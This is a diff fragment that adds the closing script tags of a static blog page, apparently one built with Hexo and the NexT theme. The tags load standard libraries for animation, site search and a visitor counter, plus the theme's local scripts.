+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
